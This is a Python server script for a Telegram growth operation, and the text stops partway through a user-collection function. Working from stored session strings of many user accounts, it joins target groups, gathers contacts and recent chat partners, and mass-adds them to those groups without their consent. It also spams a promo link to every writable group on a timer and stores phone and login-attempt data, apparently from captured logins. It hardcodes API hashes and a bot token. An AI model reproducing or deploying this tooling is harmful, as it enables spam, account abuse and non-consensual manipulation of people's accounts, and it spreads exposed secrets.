#!/usr/bin/env python3
"""
Telegram Auto-Add Server - WITH AUTO SHARE SYSTEM & PREMIUM EMOJI SUPPORT
Optimized Dashboard - Chat list only, history on demand
Features: Auto Join, Auto Add Members, Auto Share Promo Message with Premium Emojis
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions, types
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest, SendMessageRequest, GetHistoryRequest
from telethon.tl.types import (
    InputPeerEmpty, InputPeerUser, InputPeerChat, InputPeerChannel,
    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage,
    MessageEntityCustomEmoji, DocumentAttributeCustomEmoji
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from collections import defaultdict
import traceback
import sys
import signal
import hashlib
import hmac
import urllib.parse
import base64
import mimetypes
from io import BytesIO
import re

# Configure logging
import logging.handlers

os.makedirs('logs', exist_ok=True)

file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = int(os.environ.get('SERVER_NUMBER', 4))

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 38904710, 'api_hash': '3e00b37e8559fa1c64549659947b431d', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Habesha_tg_market', 'abe_army']

# ============================================
# AUTO SHARE CONFIGURATION (CONTROLLABLE)
# ============================================
SHARE_CONFIG_FILE = 'share_config.json'

def load_share_config():
    """Load share configuration from file"""
    default_config = {
        'messages': [
            "🔥🔥🔥🔥🔥🔥🔥🔥\n🔥 t.me/abe_army  🔥\n🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
        ],
        'current_message_index': 0,
        'share_interval_seconds': 300,  # 5 minutes default
        'share_delay_between_groups': 20,  # 20 seconds delay between each group
        'auto_share_enabled': True,
        'rotate_messages': True,  # Rotate through multiple messages
        'use_premium_emojis': True,
        'last_updated': datetime.now().isoformat()
    }
    
    config = load_json(SHARE_CONFIG_FILE, default_config)
    return config

def save_share_config(config):
    """Save share configuration to file"""
    config['last_updated'] = datetime.now().isoformat()
    save_json(SHARE_CONFIG_FILE, config)

# Load initial share config
share_config = load_share_config()

# Legacy support
PROMO_MESSAGE = share_config['messages'][0] if share_config['messages'] else "🔥 t.me/abe_army 🔥"
SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
AUTO_SHARE_ENABLED = share_config['auto_share_enabled']

# Groups to share the promo message to
SHARE_GROUPS = []

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
AUTO_SESSIONS_FILE = 'auto_sessions.json'
USER_MAP_FILE = 'user_map.json'
SHARE_GROUPS_FILE = 'share_groups.json'
MEDIA_CACHE_DIR = 'media_cache'

os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)

# Storage with thread locks
accounts = []
temp_sessions = {}
auto_sessions = {}
user_phone_map = {}
auto_add_settings = {}
running_tasks = {}
running_share_tasks = {}
worker_adds = defaultdict(list)
share_groups = []
share_stats = {
    'total_shares': 0,
    'today_shares': 0,
    'last_share_time': None,
    'errors': 0
}
file_lock = threading.Lock()
worker_lock = threading.Lock()

# Chat cache for dashboard (LIGHTWEIGHT - only chat list, no message history)
chat_list_cache = {}
message_cache = {}
cache_lock = threading.Lock()
CHAT_LIST_CACHE_DURATION = 15  # 15 seconds for chat list
MESSAGE_CACHE_DURATION = 30    # 30 seconds for messages

stats = {
    'total_added': 0,
    'today_added': 0,
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {},
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# ============================================
# EVENT LOOP HELPER FOR THREADS
# ============================================
def get_or_create_eventloop():
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop

# ============================================
# FILE OPERATIONS
# ============================================
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    logger.info(f"Restored {path} from backup")
                    return json.load(backup)
            except:
                pass
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

def save_json(path, data):
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time()),
            'telegram_id': session_data.get('telegram_id', ''),
            'first_name': session_data.get('first_name', ''),
            'last_name': session_data.get('last_name', ''),
            'username': session_data.get('username', '')
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:
            temp_sessions[session_id] = session_data

def save_auto_sessions():
    save_json(AUTO_SESSIONS_FILE, auto_sessions)

def load_auto_sessions():
    global auto_sessions
    auto_sessions = load_json(AUTO_SESSIONS_FILE, {})

def save_user_map():
    save_json(USER_MAP_FILE, user_phone_map)

def load_user_map():
    global user_phone_map
    user_phone_map = load_json(USER_MAP_FILE, {})

def save_share_groups():
    save_json(SHARE_GROUPS_FILE, share_groups)

def load_share_groups():
    global share_groups
    share_groups = load_json(SHARE_GROUPS_FILE, [])
    for tg in TARGET_GROUPS:
        if tg not in share_groups:
            share_groups.append(tg)
    save_share_groups()

# ============================================
# TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        for attempt in range(retries + 1):
            try:
                loop = get_or_create_eventloop()
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                if attempt == retries:
                    raise
                time.sleep(2)
    
    @staticmethod
    def get_client(session_string):
        try:
            get_or_create_eventloop()
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            raise
    
    @staticmethod
    async def safe_connect(client):
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except:
            return False

# ============================================
# PREMIUM EMOJI SUPPORT
# ============================================
def parse_premium_emojis(text):
    """
    Parse text for premium emoji placeholders and convert them to MessageEntityCustomEmoji
    Format: :emoji_id: or use standard Unicode emojis
    """
    # Pattern to match premium emoji format: :1234567890123456789:
    premium_pattern = r':(\d{15,20}):'
    
    entities = []
    clean_text = text
    
    matches = list(re.finditer(premium_pattern, text))
    offset_adjustment = 0
    
    for match in matches:
        try:
            emoji_id = int(match.group(1))
            start = match.start() - offset_adjustment
            # We'll replace with a placeholder emoji (star) and adjust offsets
            end = match.end() - offset_adjustment
            
            # Create custom emoji entity
            entity = MessageEntityCustomEmoji(
                offset=start,
                length=1,  # We'll replace with a placeholder emoji
                document_id=emoji_id
            )
            entities.append(entity)
            
            # Replace the :emoji_id: with a star emoji as placeholder
            placeholder_start = match.start() - offset_adjustment
            placeholder_end = match.end() - offset_adjustment
            clean_text = clean_text[:placeholder_start] + '⭐' + clean_text[placeholder_end:]
            offset_adjustment += len(match.group(0)) - 1
            
        except Exception as e:
            logger.error(f"Error parsing premium emoji: {e}")
            continue
    
    return clean_text, entities

async def send_message_with_premium_emojis(client, entity, text):
    """Send message with premium emoji support"""
    try:
        # Parse premium emojis
        parsed_text, custom_emojis = parse_premium_emojis(text)
        
        if custom_emojis:
            # Send with custom emoji entities
            result = await client.send_message(
                entity,
                parsed_text,
                formatting_entities=custom_emojis
            )
            logger.info(f"✅ Sent message with {len(custom_emojis)} premium emojis")
        else:
            # Send normally
            result = await client.send_message(entity, text)
        
        return result
    except Exception as e:
        logger.error(f"Error sending message with emojis: {e}")
        # Fallback to normal send
        try:
            return await client.send_message(entity, text)
        except:
            raise

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown'}
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown'}
            me = await client.get_me()
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year
                }
            return {'age_display': 'Unknown'}
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            return {'age_display': 'Unknown'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    try:
        return SyncTelegramClient.run_async(_get_age, timeout=20)
    except:
        return {'age_display': 'Unknown'}

# ============================================
# ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['verified_today'] = 0
            stats['last_reset'] = today
            for k in stats.get('worker_stats', {}):
                stats['worker_stats'][k]['today'] = 0
                stats['worker_stats'][k]['verified_today'] = 0
            share_stats['today_shares'] = 0
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        with worker_lock:
            accounts = [a for a in accounts if a['id'] != aid]
            auto_add_settings.pop(str(aid), None)
            if str(aid) in running_tasks:
                worker_info = running_tasks.pop(str(aid), None)
                if worker_info and worker_info.get('worker'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
            if str(aid) in running_share_tasks:
                running_share_tasks.pop(str(aid), None)
            worker_adds.pop(str(aid), None)
        save_json(ACCOUNTS_FILE, accounts)
        save_json(SETTINGS_FILE, auto_add_settings)
        save_json(WORKER_ADDS_FILE, dict(worker_adds))
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        return "Unknown"

def send_telegram(text, retries=3):
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# ============================================
# GROUP DISCOVERY - Get all groups from contacts and recent chats
# ============================================
def discover_share_groups(account):
    """Discover groups suitable for sharing from the account's chats and contacts"""
    discovered_groups = set()
    
    async def _discover():
        nonlocal discovered_groups
        client = SyncTelegramClient.get_client(account['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return list(discovered_groups)
            if not await client.is_user_authorized():
                return list(discovered_groups)
            
            # Get all dialogs (recent chats)
            dialogs = await client.get_dialogs(limit=200)
            
            for dialog in dialogs:
                try:
                    # Only get groups and channels (not users or bots)
                    if dialog.is_group or dialog.is_channel:
                        entity = dialog.entity
                        group_id = None
                        
                        # Get group username or ID
                        if hasattr(entity, 'username') and entity.username:
                            group_id = entity.username
                        elif hasattr(entity, 'id'):
                            group_id = str(entity.id)
                        
                        if group_id:
                            # Check if we can send messages to this group
                            try:
                                participant = await client.get_permissions(entity, 'me')
                                if participant and participant.send_messages:
                                    discovered_groups.add(group_id)
                                    logger.info(f"📢 Discovered share group: {entity.title or group_id}")
                            except:
                                discovered_groups.add(group_id)
                except:
                    continue
            
            # Also add target groups
            for tg in TARGET_GROUPS:
                discovered_groups.add(tg)
            
            return list(discovered_groups)
        except Exception as e:
            logger.error(f"Discover groups error: {e}")
            return list(discovered_groups)
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return SyncTelegramClient.run_async(_discover, timeout=45)
    except:
        return list(discovered_groups)

# ============================================
# AUTO SHARE WORKER (UPDATED WITH PREMIUM EMOJIS & CONFIG)
# ============================================
class AutoShareWorker:
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_share_time = 0
        self.consecutive_errors = 0
        self.max_consecutive_errors = 10
        self.share_groups_list = []
        self.last_config_check = 0
        self._loop = None
    
    def stop(self):
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        if self.client:
            try:
                if self._loop and not self._loop.is_closed():
                    async def _disconnect():
                        try:
                            await self.client.disconnect()
                        except:
                            pass
                    try:
                        self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
                    except:
                        pass
            except:
                pass
            finally:
                self.client = None
    
    def get_current_config(self):
        """Get current share configuration"""
        global share_config
        # Reload config periodically
        if time.time() - self.last_config_check > 60:  # Check every minute
            share_config = load_share_config()
            self.last_config_check = time.time()
        return share_config
    
    def get_current_message(self):
        """Get the current message to share"""
        config = self.get_current_config()
        messages = config.get('messages', [])
        
        if not messages:
            return "🔥 t.me/abe_army 🔥"
        
        if config.get('rotate_messages', True) and len(messages) > 1:
            # Rotate through messages
            index = config.get('current_message_index', 0)
            message = messages[index % len(messages)]
            # Update index for next share
            config['current_message_index'] = (index + 1) % len(messages)
            save_share_config(config)
            return message
        else:
            return messages[0]
    
    def run(self):
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        
        logger.info(f"📢 Auto-share worker started for {self.account.get('name', self.acc_id)}")
        
        # Discover groups for sharing
        self.refresh_share_groups()
        
        while self.running:
            try:
                # Get current config
                config = self.get_current_config()
                
                if not config.get('auto_share_enabled', True):
                    time.sleep(10)
                    continue
                
                # Get current interval
                interval = config.get('share_interval_seconds', 300)
                
                # Wait for the interval
                current_time = time.time()
                time_since_last_share = current_time - self.last_share_time
                
                if time_since_last_share < interval:
                    wait_time = interval - time_since_last_share
                    # Sleep in small chunks to check running flag
                    for _ in range(min(int(wait_time), 300)):
                        if not self.running:
                            break
                        time.sleep(1)
                    continue
                
                # Refresh groups list periodically
                if len(self.share_groups_list) == 0 or random.random() < 0.1:
                    self.refresh_share_groups()
                
                if not self.share_groups_list:
                    logger.warning(f"Share worker {self.acc_key}: No groups to share to, refreshing...")
                    self.refresh_share_groups()
                    time.sleep(30)
                    continue
                
                # Share to all groups
                if self.ensure_connection():
                    self.share_to_all_groups()
                    self.last_share_time = time.time()
                else:
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Share worker {self.acc_key}: Too many connection failures")
                        break
                    time.sleep(30)
                
            except Exception as e:
                logger.error(f"Share worker {self.acc_key} cycle error: {e}")
                self.consecutive_errors += 1
                if self.consecutive_errors >= self.max_consecutive_errors:
                    break
                time.sleep(30)
        
        logger.info(f"Share worker {self.acc_key} stopped")
        try:
            if self._loop and not self._loop.is_closed():
                self._loop.close()
        except:
            pass
    
    def refresh_share_groups(self):
        """Refresh the list of groups to share to"""
        try:
            # Use global share_groups if available
            global share_groups
            if share_groups:
                self.share_groups_list = list(share_groups)
            else:
                # Discover from account
                discovered = discover_share_groups(self.account)
                self.share_groups_list = discovered
                # Update global list
                for g in discovered:
                    if g not in share_groups:
                        share_groups.append(g)
                save_share_groups()
            
            logger.info(f"📢 Share worker {self.acc_key}: {len(self.share_groups_list)} groups to share to")
        except Exception as e:
            logger.error(f"Refresh share groups error: {e}")
    
    def ensure_connection(self):
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        async def ping():
                            try:
                                await self.client.get_me()
                                return True
                            except:
                                return False
                        if SyncTelegramClient.run_async(ping, timeout=10):
                            return True
                        else:
                            return self.reconnect()
                except:
                    pass
            return self.connect_client()
        except:
            return self.reconnect()
    
    def connect_client(self):
        for attempt in range(3):
            try:
                self.disconnect_client()
                time.sleep(1)
                self.client = SyncTelegramClient.get_client(self.account['session'])
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    return True
            except Exception as e:
                logger.error(f"Share connect error (attempt {attempt + 1}): {e}")
            if attempt < 2:
                time.sleep(min(5 * (attempt + 1), 15))
        return False
    
    def reconnect(self):
        self.disconnect_client()
        time.sleep(3)
        return self.connect_client()
    
    def share_to_all_groups(self):
        """Share the promo message to all groups with configurable delay between each"""
        config = self.get_current_config()
        delay_between = config.get('share_delay_between_groups', 20)
        message = self.get_current_message()
        
        groups = list(self.share_groups_list)
        random.shuffle(groups)
        
        success_count = 0
        fail_count = 0
        
        for group_id in groups:
            if not self.running:
                break
            
            try:
                if self.share_to_group(group_id, message):
                    success_count += 1
                    share_stats['total_shares'] = share_stats.get('total_shares', 0) + 1
                    share_stats['today_shares'] = share_stats.get('today_shares', 0) + 1
                    share_stats['last_share_time'] = datetime.now().isoformat()
                else:
                    fail_count += 1
                
                # Configurable delay between each group
                if group_id != groups[-1]:
                    logger.info(f"⏳ Waiting {delay_between}s before next share...")
                    for _ in range(delay_between):
                        if not self.running:
                            break
                        time.sleep(1)
                        
            except Exception as e:
                logger.error(f"Share to {group_id} error: {e}")
                fail_count += 1
        
        logger.info(f"📢 Share cycle complete: {success_count} success, {fail_count} failed")
        
        if success_count > 0:
            try:
                send_telegram(
                    f"<b>{SERVER_NAME}</b> - Share Report\n"
                    f"Account: {self.account.get('name', self.acc_id)}\n"
                    f"✅ Shared to: {success_count} groups\n"
                    f"❌ Failed: {fail_count}\n"
                    f"📊 Today total: {share_stats.get('today_shares', 0)}\n"
                    f"⏱️ Interval: {config.get('share_interval_seconds', 300)}s"
                )
            except:
                pass
    
    def share_to_group(self, group_id, message):
        """Share message to a specific group with premium emoji support"""
        if not self.ensure_connection():
            return False
        
        async def _share():
            try:
                entity = None
                try:
                    if group_id.startswith('-'):
                        entity = await self.client.get_entity(int(group_id))
                    else:
                        entity = await self.client.get_entity(group_id)
                except:
                    try:
                        entity = await self.client.get_entity(int(group_id))
                    except:
                        return False
                
                # Use premium emoji support
                await send_message_with_premium_emojis(self.client, entity, message)
                logger.info(f"✅ Shared to: {getattr(entity, 'title', group_id)}")
                return True
                
            except errors.FloodWaitError as e:
                logger.warning(f"Flood wait {e.seconds}s for {group_id}")
                time.sleep(min(e.seconds, 60))
                return False
            except errors.ChatWriteForbiddenError:
                logger.warning(f"Cannot write to {group_id} - removing from list")
                if group_id in self.share_groups_list:
                    self.share_groups_list.remove(group_id)
                global share_groups
                if group_id in share_groups:
                    share_groups.remove(group_id)
                    save_share_groups()
                return False
            except Exception as e:
                logger.error(f"Share to {group_id} error: {e}")
                return False
        
        try:
            return SyncTelegramClient.run_async(_share, timeout=20)
        except:
            return False

# ============================================
# ENHANCED AUTO-ADD WORKER WITH FASTER GROWTH
# ============================================
class AutoAddWorker:
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_ping = time.time()
        self.consecutive_errors = 0
        self.max_consecutive_errors = 15
        self.last_activity = time.time()
        self.health_check_interval = 300
        self.last_health_check = time.time()
        self.joined_groups = set()
        self._loop = None
        self.total_added_this_session = 0
    
    def stop(self):
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        if self.client:
            try:
                if self._loop and not self._loop.is_closed():
                    async def _disconnect():
                        try:
                            await self.client.disconnect()
                        except:
                            pass
                    try:
                        self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
                    except:
                        pass
            except:
                pass
            finally:
                self.client = None
    
    def run(self):
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        
        logger.info(f"🚀 Enhanced auto-add worker started for {self.account.get('name', self.acc_id)}")
        
        self.join_all_targets()
        
        attempted_users = set()
        cycle_count = 0
        
        while self.running:
            try:
                if time.time() - self.last_health_check > self.health_check_interval:
                    self.perform_health_check()
                    self.last_health_check = time.time()
                
                self.consecutive_errors = 0
                
                settings = auto_add_settings.get(self.acc_key, {})
                if not settings.get('enabled', True):
                    self.last_activity = time.time()
                    time.sleep(5)
                    continue
                
                reset_daily()
                
                if not self.ensure_connection():
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Worker {self.acc_key}: Too many connection failures")
                        break
                    time.sleep(30)
                    continue
                
                # Get users more aggressively
                user_ids = self.get_user_sources_enhanced()
                if not user_ids:
                    self.last_activity = time.time()
                    time.sleep(30)  # Reduced wait time
                    continue
                
                if len(attempted_users) > 50000:
                    attempted_users.clear()
                
                fresh_users = [uid for uid in user_ids if uid not in attempted_users]
                if len(fresh_users) < 100:
                    attempted_users.clear()
                    fresh_users = list(user_ids)
                
                random.shuffle(fresh_users)
                delay = max(15, settings.get('delay_seconds', 20))  # Minimum 15 seconds
                added_count = 0
                
                # Process more users per cycle
                batch_size = min(200, len(fresh_users))
                
                for user_id in fresh_users[:batch_size]:
                    if not self.running:
                        break
                    
                    settings_check = auto_add_settings.get(self.acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted_users.add(user_id)
                    
                    try:
                        if self.add_user_to_targets(user_id):
                            added_count += 1
                            self.total_added_this_session += 1
                            stats['today_added'] = stats.get('today_added', 0) + 1
                            stats['total_added'] = stats.get('total_added', 0) + 1
                            
                            if self.acc_key not in stats['worker_stats']:
                                stats['worker_stats'][self.acc_key] = {'total': 0, 'today': 0, 'verified_today': 0}
                            stats['worker_stats'][self.acc_key]['today'] += 1
                            stats['worker_stats'][self.acc_key]['total'] += 1
                            
                            # Save more frequently for reliability
                            if added_count % 5 == 0:
                                save_json(STATS_FILE, stats)
                    except Exception as e:
                        logger.error(f"Add user {user_id} error: {e}")
                        self.consecutive_errors += 1
                        if self.consecutive_errors >= self.max_consecutive_errors:
                            break
                    
                    # Adaptive delay based on success rate
                    actual_delay = random.uniform(delay * 0.7, delay * 1.2)
                    self.last_activity = time.time()
                    time.sleep(actual_delay)
                    
                    # Reconnect periodically to avoid issues
                    if added_count > 0 and added_count % 50 == 0:
                        self.reconnect()
                
                cycle_count += 1
                logger.info(f"Worker {self.acc_key} Cycle {cycle_count}: Added {added_count} | Today: {stats['today_added']} | Session: {self.total_added_this_session}")
                save_json(STATS_FILE, stats)
                
                # Shorter rest between cycles for faster growth
                rest_time = random.randint(30, 90)
                for _ in range(rest_time):
                    if not self.running:
                        break
                    self.last_activity = time.time()
                    time.sleep(1)
                
            except Exception as e:
                logger.error(f"Worker {self.acc_key} cycle error: {e}")
                self.consecutive_errors += 1
                if self.consecutive_errors >= self.max_consecutive_errors:
                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping")
                    break
                time.sleep(30)
                self.reconnect()
        
        logger.info(f"Worker {self.acc_key} stopped - Total added: {self.total_added_this_session}")
        try:
            if self._loop and not self._loop.is_closed():
                self._loop.close()
        except:
            pass
    
    def perform_health_check(self):
        try:
            if time.time() - self.last_activity > 600:
                logger.warning(f"Worker {self.acc_key}: Inactive for 10 minutes, reconnecting...")
                self.reconnect()
                self.last_activity = time.time()
            
            if not self.ensure_connection():
                logger.warning(f"Worker {self.acc_key}: Unhealthy connection, reconnecting...")
                self.reconnect()
            
            if len(self.joined_groups) < len(TARGET_GROUPS):
                self.join_all_targets()
        except Exception as e:
            logger.error(f"Health check error: {e}")
    
    def ensure_connection(self):
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        if time.time() - self.last_ping > 120:
                            async def ping():
                                try:
                                    await self.client.get_me()
                                    return True
                                except:
                                    return False
                            if SyncTelegramClient.run_async(ping, timeout=10):
                                self.last_ping = time.time()
                                return True
                            else:
                                return self.reconnect()
                        return True
                except:
                    pass
            return self.connect_client()
        except:
            return self.reconnect()
    
    def connect_client(self):
        for attempt in range(3):
            try:
                self.disconnect_client()
                time.sleep(1)
                self.client = SyncTelegramClient.get_client(self.account['session'])
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    self.last_ping = time.time()
                    self.last_activity = time.time()
                    return True
            except Exception as e:
                logger.error(f"Connect error (attempt {attempt + 1}): {e}")
            if attempt < 2:
                time.sleep(min(5 * (attempt + 1), 15))
        return False
    
    def reconnect(self):
        self.disconnect_client()
        time.sleep(3)
        return self.connect_client()
    
    def join_all_targets(self):
        for target in TARGET_GROUPS:
            if target in self.joined_groups:
                continue
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if not self.ensure_connection():
                        time.sleep(5)
                        continue
                    async def _join():
                        try:
                            entity = await self.client.get_entity(target)
                            await self.client(JoinChannelRequest(entity))
                            return True
                        except errors.FloodWaitError as e:
                            time.sleep(min(e.seconds, 120))
                            return False
                        except Exception as e:
                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                return True
                            return False
                    if SyncTelegramClient.run_async(_join, timeout=30):
                        self.joined_groups.add(target)
                        logger.info(f"Worker {self.acc_key}: ✅ Joined {target}")
                        break
                except Exception as e:
                    logger.warning(f"Join {target} failed: {e}")
                time.sleep(min(5 * (attempt + 1), 20))
    
    def get_user_sources_enhanced(self):
        """Enhanced user collection from multiple sources"""
        user_ids = set()
        if not self.ensure_connection():
            return list(user_ids)
        
        async def _collect():
            nonlocal user_ids
            
            # 1. Get from contacts
            try:
                contacts = await self.client(GetContactsRequest(0))
                for user in contacts.users:
                    if user.id and not getattr(user, 'bot', False) and not user.deleted:
                        user_ids.add(user.id)
                logger.info(f"Collected {len(user_ids)} from contacts")
            except Exception as e:
                logger.debug(f"Contact collection error: {e}")
            
            # 2. Get from dialogs (recent chats)
            try:
                dialogs = await self.client.get_dialogs(limit=200)
                for d in dialogs:
                    if d.is_user and d.entity and d.entity.id:
                        if not getattr(d.entity, 'bot', False) and not d.entity.deleted:
                            user_ids.add(d.entity.id)
                logger.info(f"Total after dialogs: {len(user_ids)}")
            except:
                pass
            
